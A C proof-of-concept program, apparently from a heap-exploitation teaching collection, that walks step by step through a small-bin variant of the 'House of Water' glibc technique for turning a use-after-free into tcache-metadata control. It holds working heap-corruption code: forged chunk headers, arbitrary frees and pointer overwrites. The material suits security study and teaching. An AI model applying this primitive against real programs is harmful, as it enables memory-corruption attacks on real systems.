#include <stdio.h>
#include <stdlib.h>

/*
 * House of Water is a technique for converting a Use-After-Free (UAF) vulnerability
 * into a tcache metadata control primitive, with the additional benefit of obtaining
 * a free libc pointer from within the tcache metadata.
 *
 * This technique is a variant of the original House of Water. 
 * Instead of targeting unsorted bins, it targets small bins. 
 * This variant of the technique avoid relying on heap address leaks or brute‑forcing, 
 * and removes the need for large chunk allocations.
 *
 * There is no need to forge a size field inside the tcache structure, 
 * since the fake chunk is linked through a small bin.
 *
 * First, we craft fake `fd` and `bk` pointers above the 0x320 and 0x330 tcache‑linked chunks. 
 * We then build a fake linked list of three chunks in the 0x90 small bin,
 * such that the second byte of the middle chunk’s address matches the second byte of the tcache end pointer. 
 * This alignment allows us to avoid relying on partial heap leaks or brute‑forcing.
 *
 * Finally, we link the fake chunk by overwriting the least significant bytes of the
 * `fd` and `bk` pointers of the start and end chunks in the small bin with a single NULL byte, 
 * causing them to point to the fake chunk located above the 0x320 and 0x330 tcache bins.
 *
 * Credits for the original technique go to @udp_ctf (Water Paddler / Blue Water).
 * Credits for this small‑bin variant go to Noam Afergan (@4f3rg4n).
 */



void dump_memory(void *addr, unsigned long count) {
	for (unsigned int i = 0; i < count*16; i += 16) {
		printf("0x%016lx\t\t0x%016lx  0x%016lx\n", (unsigned long)(addr+i), *(long *)(addr+i), *(long *)(addr+i+0x8));
	}	
}

int main(void) {
	// Dummy variable
	void *_ = NULL;

	// Prevent _IO_FILE from buffering in the heap
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);
	setbuf(stderr, NULL);


	puts("\n");
	puts("\t==============================");
	puts("\t|           STEP 1           |");
	puts("\t==============================");
	puts("\n");

	// Step 1: Create the unsorted bins linked list, used for hijacking at a later time

    // Note: In contrast to the original House of Water, we allocate these three
    // chunks first. This is required later in the technique, when we overwrite
    // the LSBs of the unsorted-bin pointers.
    // Our goal is for the `small_middle` chunk to be placed in the same address region
	// as the last part of the tcache metadata. 
	// Since this region is determined by the first nibble of the second byte of the address, this
    // layout avoids the need to brute-force or leak it.

    puts("Now, allocate three 0x90 chunks with guard chunks in between. This prevents");
	puts("chunk-consolidation and sets our target for the house of water attack.");
	puts("\t- chunks:");

	void *small_middle = malloc(0x88);
	printf("\t\t* small_middle\t@ %p\n", small_middle);
	_ = malloc(0x18); // Guard chunk
	
	puts("\t\t* /guard/");

	void *small_start = malloc(0x88);
	printf("\t\t* small_start\t@ %p\n", small_start);
	_ = malloc(0x18); // Guard chunk
	
	puts("\t\t* /guard/");

	void *small_end = malloc(0x88);
	printf("\t\t* small_end\t@ %p\n", small_end);
	_ = malloc(0x18); // Guard chunk
	
	puts("\t\t* /guard/");
	
	puts("");


	puts("\n");
	puts("\t==============================");
	puts("\t|           STEP 2           |");
	puts("\t==============================");
	puts("\n");

	// Step 2: Fill up t-cache for 0x90 size class
	
	// This is just to make a pointer to the t-cache metadata for later.
	void *metadata = (void *)((long)(small_middle) & ~(0xfff));

	// Make allocations to free such that we can exhaust the 0x90 t-cache
	puts("Allocate 7 0x88 chunks needed to fill out the 0x90 t-cache at a later time");
	void *x[7];
	for (int i = 0; i < 7; i++) {
		x[i] = malloc(0x88);
	}

	puts("");

	// Free t-cache entries
	puts("Fill up the 0x90 t-cache with the chunks allocated from earlier by free'ing them.");	
	puts("By doing so, the next time a 0x88 chunk is free'd, it ends up in the unsorted-bin");
	puts("instead of the t-cache or small-bins.");
	for (int i = 0; i < 7; i++) {
		free(x[i]);
	}

	
	puts("\n");
	puts("\t==============================");
	puts("\t|           STEP 3           |");
	puts("\t==============================");
	puts("\n");

	// Step 3: Create a 0x320 and a 0x330 t-cache entry which overlaps small_start and small_end.
    // By doing this, we can blindly fake a FWD and BCK pointer in the t-cache metadata!

    // Note: Notice that we are creating a 0x320 and 0x330 t-cache entry not 0x20 and 0x30,
    // Because we want to link our fake chunk by overwriting only the LSBs of the
    // unsorted-bin pointers later, without brute-forcing or leaking addresses,
    // we must place the fake chunk together with its forged `fd` and `bk` pointers
    // in the same address region as the `small_middle` chunk. 
    // This allows us to modify only the least significant byte of the address, 
    // without needing to brute-force or leak the second nibble of the second byte.
		
	puts("Here comes the trickiest part!\n");
	
	puts("We essentially want a pointer in the 0x320 t-cache metadata to act as a FWD\n"
	"pointer and a pointer in the 0x330 t-cache to act as a BCK pointer.");
	puts("We want it such that it points to the chunk header of our small bin entries,\n"
	"and not at the chunk itself which is common for t-cache.\n");

	puts("It should look like the following:");
	puts("");
	
	puts("small_start:");
	printf("0x%016lx\t\t0x%016lx  0x%016lx  <-- tcachebins[0x330][0/1], unsortedbin[all][0]\n", (unsigned long)(small_start-0x10), *(long *)(small_start-0x10), *(long *)(small_start-0x8));
	dump_memory(small_start, 2);
	puts("");

	puts("small_end:");
	printf("0x%016lx\t\t0x%016lx  0x%016lx  <-- tcachebins[0x320][0/1], unsortedbin[all][2]\n", (unsigned long)(small_end-0x10), *(long *)(small_end-0x10), *(long *)(small_end-0x8));
	dump_memory(small_end, 2);
	
	puts("\n");

	puts("For the sake of simplicity, let's just simulate an arbitrary free primitive.");
	puts("\n");
	
	
	puts("--------------------");
	puts("|      PART 1      |");
	puts("--------------------");
	puts("\n");

	// Step 3 part 1:
	puts("Write 0x331 above small_start to enable its free'ing into the 0x330 t-cache.");
	printf("\t*%p-0x18 = 0x331\n", small_start);
	*(long*)(small_start-0x18) = 0x331; 
	puts("");

	puts("This creates a 0x331 entry just above small_start, which looks like the following:");
	dump_memory(small_start-0x20, 3);
	puts("");

	printf("Free the faked 0x331 chunk @ %p\n", small_start-0x10);
	free(small_start-0x10); // Create a fake FWD
	puts("");
	
	puts("Finally, because of the meta-data created by free'ing the 0x331 chunk, we need to");
	puts("restore the original header of the small_start chunk by restoring the 0x91 header:");
	printf("\t*%p-0x8 = 0x91\n", small_start);
	*(long*)(small_start-0x8) = 0x91; 
	puts("");

	puts("Now, let's do the same for small_end except using a 0x321 faked chunk.");
	puts("");


	puts("--------------------");
	puts("|      PART 2      |");
	puts("--------------------");
	puts("\n");

	// Step 3 part 2:
	puts("Write 0x321 above small_end, such that it can be free'd into the 0x320 t-cache:");
	printf("\t*%p-0x18 = 0x321\n", small_end);
	*(long*)(small_end-0x18) = 0x321; 
	puts("");
	
	puts("This creates a 0x321 just above small_end, which looks like the following:");
	dump_memory(small_end-0x20, 3);
	puts("");
	
	printf("Free the faked 0x321 chunk @ %p\n", small_end-0x10);
	free(small_end-0x10); // Create a fake BCK
	puts("");
	
	puts("restore the original header of the small_end chunk by restoring the 0x91 header:");
	printf("\t*%p-0x8 = 0x91\n", small_end);
	*(long*)(small_end-0x8) = 0x91; 
	puts("");


	puts("\n");
	puts("\t==============================");
	puts("\t|           STEP 4           |");
	puts("\t==============================");
	puts("\n");

	// Step 4: Create the small bin list by freeing small_start, small_middle, small_end into the unsorted bin,
    // then allocate large chunk that will sort the unsorted bin into small bins.

	puts("Now, let's free the the chunks into the unsorted bin.");
	
	puts("\t> free(small_end);");
	free(small_end);
	
	puts("\t> free(small_middle);");
	free(small_middle);
	
	puts("\t> free(small_start);");
	free(small_start);
	
	puts("\n");

    puts("Now allocate a large chunk to trigger the sorting of the unsorted bin entries into the small bin.");
    _ = malloc(0x700);

    puts("");

	// Show the setup as is	
	
	puts("At this point, our heap looks something like this:");
	
	printf("\t- Small bin:\n");
	puts("\t\tsmall_start <--> small_middle <--> small_end");
	printf("\t\t%p <--> %p <--> %p\n", small_start-0x10, small_middle-0x10, small_end-0x10);
	
	printf("\t- 0x320 t-cache:\n");
	printf("\t\t* 0x%lx\n", *(long*)(metadata+0x390));
	printf("\t- 0x330 t-cache\n");
	printf("\t\t* 0x%lx\n", *(long*)(metadata+0x398));
	puts("");

	puts("The fake chunk in the t-cache will look like the following:");
	dump_memory(metadata+0x370, 4);
	puts("");

	puts("We can now observe that the 0x330 t-cache points to small_start and 0x320 t-cache points to ");
	puts("small_end, which is what we need to fake a small-bin entry and hijack small_middle.");


	puts("\n");
	puts("\t==============================");
	puts("\t|           STEP 5           |");
	puts("\t==============================");
	puts("\n");

	// Step 5: Overwrite LSB of small_start and small_end to point to the fake t-cache metadata chunk
	puts("Finally, all there is left to do is simply overwrite the LSB of small_start FWD-");
	puts("and BCK pointer for small_end to point to the faked t-cache metadata chunk.");
	puts("");

	// Note: we simply overwrite the LSBs of small_start and small_end with a single NULL byte instead of 0x90;
	// as a result, they point to our fake chunk placed in the tcache in the same address region of the small_middle chunk.
	
	/* VULNERABILITY */
	printf("\t- small_start:\n");
	printf("\t\t*%p = %p\n", small_start, metadata+0x200); 
	*(unsigned long *)small_start = (unsigned long)(metadata+0x200);
	puts("");

	printf("\t- small_end:\n");
	printf("\t\t*%p = %p\n", small_end, metadata+0x200); 
	*(unsigned long *)(small_end+0x8) = (unsigned long)(metadata+0x200);
	puts("");
	/* VULNERABILITY */

	puts("At this point, the small bin will look like the following:");
	puts("");

	puts("\t- small bin:");
	printf("\t\t small_start <--> metadata chunk <--> small_end\n");
	printf("\t\t %p\t     %p      %p\n", small_start, metadata+0x200, small_end);


	puts("\n");
	puts("\t==============================");
	puts("\t|           STEP 6           |");
	puts("\t==============================");
	puts("\n");

	// Step 6: allocate to win
	puts("Now, simply just allocate our small chunk which is placed inside the small bin");
	puts("But first, we need to clean the t-cache for 0x90 size class to force malloc to");
    puts("service the allocation from the small bin.");

    for(int i = 7; i > 0; i--)
        _ = malloc(0x88);

    // Allocating small_start, and small_end again to remove them from the small bin
    _ = malloc(0x88);
    _ = malloc(0x88);

	void *meta_chunk = malloc(0x88);
	printf("\t\t* meta_chunk\t@ %p\n", meta_chunk);
    
}
